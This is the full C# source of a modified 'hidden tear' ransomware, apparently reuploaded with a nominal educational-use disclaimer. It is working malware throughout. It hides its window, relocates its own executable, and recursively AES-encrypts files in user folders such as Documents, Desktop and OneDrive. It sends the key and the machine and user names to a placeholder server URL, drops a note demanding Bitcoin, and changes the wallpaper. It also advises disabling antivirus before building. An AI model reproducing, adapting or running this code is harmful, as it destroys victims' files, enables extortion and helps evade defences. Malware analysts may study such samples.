/*
 _     _     _     _              _                  
| |   (_)   | |   | |            | |                 
| |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
| '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
| | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
|_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|  
 *
 * Disable antivirus and windows defender before to compile...
 * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com Modified and reuploaded By Virgula 
 * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
 * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
 * 
 * Ve durdu saatler 
 * Susuyor seni zaman
 * Sesin dondu kulagimda
 * Dedi uykudan uyan
 * 
 * Yine boyle bir aksamdi
 * Sen guluyordun ya gozlerimin icine
 * Feslegenler boy vermisti
 * Gokten parlak bir yildiz dustu pesine
 * Sakladim gozyaslarimi
 */

using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;


namespace hidden_tear
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        //Url to send encryption password and computer info
        string targetURL = "http://www.example.com/Server/write.php";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\";
        string backgroundImageUrl = "http://imgur.com/a/F0uSC"; //desktop background picture



        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
            //starts encryption at form load
            startAction();

        }

        //hide process also from taskmanager
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }

        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        //creates random password for encryption
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"; //patern allowed
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--) {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        //Sends created password target location
        public void SendPassword(string password) {

            try
            {
                string info = "?computer_name=" + computerName + "&userName=" + userName + "&password=" + password + "&allow=ransom";
                var fullUrl = targetURL + info;
                var conent = new System.Net.WebClient().DownloadString(fullUrl);
            }
            catch (Exception)
            {
                
            }
        }

        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            string users = "Users\\";
            string path_inf = users + userName + "\\Desktop\\READ_IT.txt.locked";       //path of the info file
            string fullpath_inf = userDir + path_inf;
            if (File.Exists(fullpath_inf))
            {
                File.Delete(fullpath_inf);
            }
            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file + ".locked");    //exstension of hacked files
        }

        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {
            try
            {
                //extensions to be encrypt please don't add .ini or the virus will crash before to encrypts all datas
                var validExtensions = new[]
                {
                        ".txt", ".jar", ".exe", ".dat", ".contact" , ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd" , ".pdf" , ".dll" , ".c" , ".cs", ".mp3" , ".mp4", ".f3d" , ".dwg" , ".cpp" , ".zip" , ".rar" , ".mov" , ".rtf" , ".bmp" , ".mkv" , ".avi" , ".apk" , ".lnk" , ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj" , ".pdb", ".ico" , ".pas" , ".db" ,  ".torrent"

                };

                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (validExtensions.Contains(extension))
                    {
                        EncryptFile(files[i], password);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    encryptDirectory(childDirectories[i], password);
                }
            } catch (Exception)
            {

            }
        }

        //create a random dir and move virus on it to avoid conflicts with encryption itself
        public void MoveVirus()
        {
            string destFileName = userDir + userName + "\\Rand123";
            string destFileName_2 = userDir + userName + "\\Rand123\\local.exe";
            if (!Directory.Exists(destFileName))
            {
                Directory.CreateDirectory(destFileName);
            }
            else
            {
                if (File.Exists(destFileName_2))
                {
                    File.Delete(destFileName_2);
                }
            }
            string name = "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
            string curFile = Directory.GetCurrentDirectory() + name;
            string sourceFileName = curFile;
            File.Move(sourceFileName, destFileName_2);

        }

        //check for internet connection
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                {
                    using (var stream = client.OpenRead("https://www.google.com"))
                    {
                        return true;
                    }
                }
            }
            catch
            {
                return false;
            }
        }

        public void startAction()
        {
            MoveVirus();
            string password = CreatePassword(15);
            Directory_Settings_Sending(password);
            messageCreator();
            bool Internet;
            string backgroundImageName = userDir + userName + "\\ransom.jpg";
            // creating a loop if connection doesn't exist while it is available again to send password and change background desktop
            do
            {
                Internet = CheckForInternetConnection();
                if (Internet == true)
                {
                    SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
                    SendPassword(password);
                }
            } while (Internet == false) ;
            password = null;
            System.Windows.Forms.Application.Exit();
        }

        public void Directory_Settings_Sending(string password){
            //path to ecnrypt (child drectories already included)
            string path_1 = "Users\\";
            string startPath_1 = userDir + path_1 + userName + "\\Desktop";
            string startPath_2 = userDir + path_1 + userName + "\\Links";
            string startPath_3 = userDir + path_1 + userName + "\\Contacts";
            string startPath_4 = userDir + path_1 + userName + "\\Desktop";
            string startPath_5 = userDir + path_1 + userName + "\\Documents";
            string startPath_6 = userDir + path_1 + userName + "\\Downloads";
            string startPath_7 = userDir + path_1 + userName + "\\Pictures";
            string startPath_8 = userDir + path_1 + userName + "\\Music";
            string startPath_9 = userDir + path_1 + userName + "\\OneDrive";
            string startPath_10 = userDir + path_1 + userName + "\\Saved Games";
            string startPath_11 = userDir + path_1 + userName + "\\Favorites";
            string startPath_12 = userDir + path_1 + userName + "\\Searches";
            string startPath_13 = userDir + path_1 + userName + "\\Videos";
            encryptDirectory(startPath_1, password);
            encryptDirectory(startPath_2, password);
            encryptDirectory(startPath_3, password);
            encryptDirectory(startPath_4, password);
            encryptDirectory(startPath_5, password);
            encryptDirectory(startPath_6, password);
            encryptDirectory(startPath_7, password);
            encryptDirectory(startPath_8, password);
            encryptDirectory(startPath_9, password);
            encryptDirectory(startPath_10, password);
            encryptDirectory(startPath_11, password);
            encryptDirectory(startPath_12, password);
            encryptDirectory(startPath_13, password);
        }

        public void messageCreator()
        {
            string path = "\\Desktop\\READ_IT.txt";
            string fullpath = userDir + "Users\\" + userName + path;
            string infos = computerName + "-" + userName;
            string[] lines = { "This computer has been hacked","Your personal files have been ecrypted. Send me BTC or food to get decryption passcode.", "After that, you'll be able to see your beloved files again.","With love... Hidden Tear Project :')"};
            System.IO.File.WriteAllLines(fullpath, lines);
        }

        //Changes desktop background image
        public void SetWallpaper(String path)
        {
            SystemParametersInfo(0x14, 0, path, 0x01 | 0x02);
        }

        //Downloads image from web
        private void SetWallpaperFromWeb(string url, string path)
        {
            try
            {
                WebClient webClient = new WebClient();
                webClient.DownloadFile(new Uri(url), path);
                SetWallpaper(path);
            }
            catch (Exception){ }
        }
    }
}
